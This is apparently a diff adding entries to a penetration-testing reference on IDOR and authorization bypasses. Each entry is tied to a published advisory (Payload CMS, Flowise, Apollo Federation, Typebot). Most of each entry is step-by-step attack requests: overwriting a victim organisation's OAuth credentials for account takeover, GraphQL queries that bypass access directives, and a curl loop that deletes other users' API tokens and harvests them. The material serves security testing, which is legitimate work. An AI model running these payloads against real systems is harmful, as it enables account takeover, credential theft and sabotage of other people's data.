+# Common body parameter names that override path params:
+# documentId, targetUserId, sourceId, resourceId, projectId, workspaceId, tenantId
+# Often found in: schedule/automation creation, copy/clone operations, batch actions
+
+# Burp tip: in Proxy history, compare the IDs in the URL vs. the body — any discrepancy
+# is a split-trust candidate. Swap the body ID to a foreign value and replay.
+```
+**Source:** https://github.com/briefercloud/briefer/issues/369
+
+---
+
+## Multi-Auth-Collection Auto-Increment ID Collision IDOR
+**Reference type:** Sequential integer (colliding across auth collections)
+**API pattern:** REST (CMS / multi-collection platform APIs)
+**Authorization flaw:** A platform with multiple user authentication collections (e.g., `admins` and `customers`) generates auto-increment primary keys independently per collection when using relational databases (PostgreSQL serial, MySQL auto_increment, SQLite ROWID). When the access control layer checks numeric ID equality but not collection context, User ID 5 in `admins` and User ID 5 in `customers` are treated as the same object. An admin (id=5) can read, write, or delete the preferences/data of a customer (id=5) and vice versa.
+**Escalation:** Horizontal (cross-collection data access)
+**Business impact:** Authenticated users in any auth collection can access or sabotage data belonging to users in other collections who happen to share the same numeric ID. High probability of collision in any platform with multiple user types. Confirmed in Payload CMS v3 < 3.74.0 (CVE-2026-25574) affecting PostgreSQL and SQLite adapters.
+**Test payload:**
+```http
+# Step 1: Identify your own ID in your collection:
+GET /api/users/me HTTP/1.1
+Cookie: <admin-session>
+→ {"id": 5, "email": "admin@example.com", "collection": "admins"}
+
+# Step 2: Target the preferences/data endpoint for id=5 (your ID):
+GET /api/payload-preferences/5 HTTP/1.1
+Cookie: <admin-session>
+→ Returns your preferences
+
+# Step 3: The same request, but from a different collection perspective
+# If a customer also has id=5, your token retrieves their preferences:
+# (Test by checking the email/name in the response vs. your own)
+DELETE /api/payload-preferences/5 HTTP/1.1
+Cookie: <admin-session>
+→ Deletes preferences of whoever has id=5 (could be another collection's user)
+
+# Step 4: Confirm collision by checking what user_id=5 corresponds to in each collection:
+GET /api/admins/5 HTTP/1.1
+GET /api/customers/5 HTTP/1.1
+# If both return different users → collision confirmed
+
+# Generalization — any platform with multiple user models and integer PKs:
+# 1. Get your own integer ID from any auth collection
+# 2. Try to access resources scoped to that integer ID across other collections
+# 3. Most impactful: preferences, settings, sessions, tokens, MFA devices
+
+# Affected pattern: any framework where collection context is lost after ID extraction
+# Particularly: ORMs that look up by PK without scoping to a table/model
+# Detection: look for "collection" or "model" fields missing from ACL lookups in source
+```
+**Source:** https://github.com/payloadcms/payload/security/advisories/GHSA-jq29-r496-r955 (CVE-2026-25574)
+
+---
+
+## SSO Configuration IDOR → OAuth Credential Replacement → ATO Chain
+**Reference type:** UUID (`organizationId`)
+**API pattern:** REST (SSO/OAuth configuration endpoint)
+**Authorization flaw:** The SSO configuration endpoint (`PUT /api/loginmethod`) validates that the caller has a valid session token but does not validate that the `organizationId` in the request body matches the authenticated user's own organization. Any authenticated user (including free-tier) can supply a victim organization's UUID and replace their OAuth client credentials with attacker-controlled ones. The next legitimate user from the victim org who clicks "Login with Google/GitHub" is redirected through the attacker's OAuth app, handing over the authorization code.
+**Escalation:** Horizontal → Full Account Takeover chain
+**Business impact:** Complete account takeover of all users in any target organization via OAuth hijack. Additionally enables free-tier users to activate paid enterprise SSO/SAML features for free. CVSS 8.8. Confirmed in Flowise (CVE-2026-30823). The pattern recurs in any multi-tenant SaaS that stores OAuth client credentials per organization without validating ownership on update.
+**Test payload:**
+```http
+# Step 1: Normal SSO config — update YOUR organization's OAuth settings:
+PUT /api/v1/loginmethod HTTP/1.1
+Host: flowise.target.com
+Authorization: Bearer <your-jwt>
+Content-Type: application/json
+{
+  "organizationId": "YOUR_ORG_UUID",
+  "providers": [{"providerLabel": "Google", "providerName": "google",
+    "config": {"clientID": "your-client-id", "clientSecret": "your-secret"},
+    "status": "enable"}]
+}
+
+# Step 2: IDOR — substitute victim org's UUID in the body (auth still passes):
+PUT /api/v1/loginmethod HTTP/1.1
+Authorization: Bearer <your-jwt>
+Content-Type: application/json
+{
+  "organizationId": "VICTIM_ORG_UUID",   ← replaced with target organization
+  "providers": [{"providerLabel": "Google", "providerName": "google",
+    "config": {
+      "clientID": "ATTACKER_MALICIOUS_CLIENT_ID",
+      "clientSecret": "ATTACKER_MALICIOUS_SECRET"
+    },
+    "status": "enable"}]
+}
+→ Victim org's SSO config replaced with attacker's OAuth credentials
+
+# Step 3: Wait for victim org user to click "Login with Google"
+# → Victim's browser redirected to Google OAuth with attacker's client_id
+# → Authorization code sent to attacker's redirect_uri
+# → Attacker exchanges code for access token → full account takeover
+
+# Generalization — test any SSO/IdP configuration endpoint:
+# PUT /api/saml/config, PUT /api/sso/settings, PUT /api/identity-providers/{id}
+# Key indicator: organizationId, tenantId, or workspaceId in the request BODY (not URL)
+#   while authorization only validates the JWT, not that body.orgId === JWT.orgId
+
+# Also test: enabling/disabling SSO for another org (could lock users out)
+PUT /api/v1/loginmethod {"organizationId": "VICTIM_ORG", "providers": [], "status": "disable"}
+# → Disables SSO for victim org → their users can no longer log in (DoS)
+```
+**Source:** https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-cwc3-p92j-g7qm (CVE-2026-30823)
+
+---
+
+## GraphQL Federation Interface Directive Bypass
+**Reference type:** Object ID (via inline/named fragment on implementing type)
+**API pattern:** GraphQL (Apollo Federation with `@authenticated` / `@requiresScopes` / `@policy`)
+**Authorization flaw:** Apollo Federation access-control directives placed on a GraphQL **interface** type or field are not inherited by implementing concrete types. When a client queries the same field via an inline or named fragment on the implementing type rather than the interface, the directive check is not applied to the concrete type resolver. This is a spec-compliant behavior that creates a systematic authorization gap.
+**Escalation:** Horizontal / Vertical (any field protected only at interface level)
+**Business impact:** Every field guarded exclusively with `@authenticated` or `@requiresScopes` on an interface is silently unprotected when accessed via the implementing type. Unauthenticated callers can access fields the developer believed were locked. Affects `@apollo/composition` < 2.9.5 / 2.10.4 / 2.11.5 / 2.12.1.
+**Test payload:**
+```graphql
+# Step 1: Identify interfaces with access-control directives via introspection:
+query {
+  __schema {
+    types {
+      name
+      kind
+      interfaces { name }
+      fields {
+        name
+        isDeprecated
+      }
+    }
+  }
+}
+# Look for: interface types with fields, and concrete types that implement them
+
+# Step 2: Normal query via interface — directive fires, access denied:
+query AuthRequired {
+  node(id: "user_abc123") {
+    ... on Node {        # Node is the interface — @authenticated applied here
+      id
+      sensitiveField    # access denied to unauthenticated callers
+    }
+  }
+}
+→ 401 Unauthorized (directive correctly enforced on interface)
+
+# Step 3: Bypass — query via concrete implementing type instead:
+query BypassAuth {
+  node(id: "user_abc123") {
+    ... on User {        # User implements Node — directive NOT re-applied
+      id
+      sensitiveField     # returns data despite @authenticated on interface
+      email
+      role
+      creditCardNumber
+    }
+  }
+}
+→ 200 OK with sensitive data (directive only fires on interface, not concrete type)
+
+# Step 4: Named fragment variant (same bypass):
+fragment UserFields on User {
+  id
+  sensitiveField
+}
+
+query BypassAuthNamed {
+  node(id: "user_abc123") {
+    ...UserFields   ← spreads onto User, not Node → directive bypassed
+  }
+}
+
+# Identification: look for directives in schema that appear only on interface fields
+# rover graph introspect → check __Schema for directive locations
+# Affected: Apollo Router < 1.63.0 (patch released Nov 2025)
+```
+**Source:** https://github.com/apollographql/federation/security/advisories/GHSA-mx7m-j9xf-62hw (CVE-2025-64530)
+
+---
+
+## GraphQL Federation @requires Transitive Field Bypass
+**Reference type:** GraphQL field dependency (via `@requires` or `@fromContext` resolver chain)
+**API pattern:** GraphQL (Apollo Federation)
+**Authorization flaw:** When a non-protected field uses `@requires(fields: "protectedField")` to declare a dependency, Apollo Router fetches `protectedField` from the subgraph at resolve time as a dependency computation — **without evaluating `protectedField`'s own `@authenticated` or `@requiresScopes` directive**. Access control is only checked when a field appears explicitly in the client query; transitive dependency fetches are unchecked, exposing the protected data indirectly via any field that depends on it.
+**Escalation:** Horizontal (any protected field accessible transitively)
+**Business impact:** Protected fields become fully accessible by querying any unprotected field that depends on them. One dependency relationship quietly negates all field-level security. Fixed in `@apollo/composition` ≥ 2.9.5 / 2.10.4 / 2.11.5 / 2.12.1 (Nov 2025).
+**Test payload:**
+```graphql
+# Assume the schema has:
+# sensitiveEmail: String @authenticated
+# displayLabel: String @requires(fields: "sensitiveEmail")
+
+# Step 1: Direct query — blocked by @authenticated:
+query DirectAttempt {
+  user(id: "victim-id") {
+    sensitiveEmail   # → 401 Unauthorized
+  }
+}
+
+# Step 2: Transitive bypass — query displayLabel (not protected),
+#          which silently fetches sensitiveEmail as a @requires dependency:
+query TransitiveBypass {
+  user(id: "victim-id") {
+    displayLabel     # fetches sensitiveEmail internally, no auth check on dependency
+    # displayLabel value may embed or leak the resolved sensitiveEmail
+  }
+}
+→ 200 OK — sensitiveEmail resolved and potentially reflected in displayLabel
+
+# Step 3: Expand to all @requires / @fromContext fields for deeper leak:
+query {
+  product(id: "prod_123") {
+    discountedPrice   # @requires(fields: "internalCostPrice memberTier")
+    # fetches internalCostPrice (@authenticated) as dependency without auth check
+  }
+}
+
+# Discovery procedure:
+# 1. rover subgraph introspect https://target.com/subgraph → download SDL
+# 2. grep for @requires( in the SDL
+# 3. For each @requires, check if the required field has @authenticated/@requiresScopes
+# 4. Query the field with @requires using an unauthenticated or low-privilege token
+# 5. Observe whether the protected data appears in the response (directly or indirectly)
+
+# Affected: Apollo Router < 1.63.0, @apollo/composition < 2.9.5/2.10.4/2.11.5/2.12.1
+```
+**Source:** https://github.com/apollographql/federation/security/advisories/GHSA-m8jr-fxqx-8xx6
+
+---
+
+## API Token IDOR with Credential Exposure in DELETE Response
+**Reference type:** Integer pair (`userId` + `tokenId`)
+**API pattern:** REST
+**Authorization flaw:** Token management endpoints (`DELETE /api/users/{userId}/api-tokens/{tokenId}`) validate that the caller is authenticated but not that the authenticated user owns `{userId}`. The DELETE response body compounds this by returning the **plaintext value of the deleted token** — transforming a blind IDOR (silent sabotage) into a credential theft chain. Any authenticated user can delete any other user's API token and receive the raw credential in the response.
+**Escalation:** Horizontal
+**Business impact:** Dual impact: (1) integration disruption — silently revokes another user's API token, breaking their automations; (2) credential theft — attacker receives the plaintext API token in the response and can impersonate the victim on all platforms that accept that token. Confirmed in Typebot (CVE-2025-64706). The pattern applies to any token revocation endpoint that echoes the token value back.
+**Test payload:**
+```http
+# Step 1: Observe the token delete endpoint format from your own token management:
+DELETE /api/users/YOUR_USER_ID/api-tokens/YOUR_TOKEN_ID HTTP/1.1
+Host: target.com
+Cookie: <your-session>
+→ 200 OK {"deleted": true, "token": "tbp_youractualplaintexttoken12345"}
+
+# Step 2: IDOR — substitute victim's userId and tokenId:
+DELETE /api/users/VICTIM_USER_ID/api-tokens/VICTIM_TOKEN_ID HTTP/1.1
+Host: target.com
+Cookie: <your-session>
+→ 200 OK {"deleted": true, "token": "tbp_victimplaintexttoken98765"}
+# Victim's token is now both revoked AND in attacker's hands
+
+# Step 3: Use the extracted token to impersonate the victim:
+GET /api/me HTTP/1.1
+Authorization: Bearer tbp_victimplaintexttoken98765
+→ Returns victim's full account details as authenticated user
+
+# Token ID enumeration — find victim's token IDs:
+GET /api/users/VICTIM_USER_ID/api-tokens HTTP/1.1
+Cookie: <your-session>
+→ If list endpoint also has IDOR: returns victim's token list with IDs
+
+# Alternative: if userId is sequential, enumerate to find accounts with API tokens:
+for uid in $(seq 1 200); do
+  curl -s -X DELETE "https://target.com/api/users/$uid/api-tokens/1" \
+    -H "Cookie: session=<yours>" | grep -i "token"
+done
+
+# General pattern — test any token/credential management endpoint for this dual flaw:
+DELETE /api/apikeys/{id}          ← does response echo the key value?
+DELETE /api/tokens/{id}/revoke    ← does response include the token?
+DELETE /api/credentials/{id}      ← does response include the credential?
+POST   /api/tokens/{id}/reset     ← does response echo old + new token?
+```
+**Source:** https://github.com/baptisteArno/typebot.io/security/advisories/GHSA-grx8-g27p-8hpp (CVE-2025-64706)
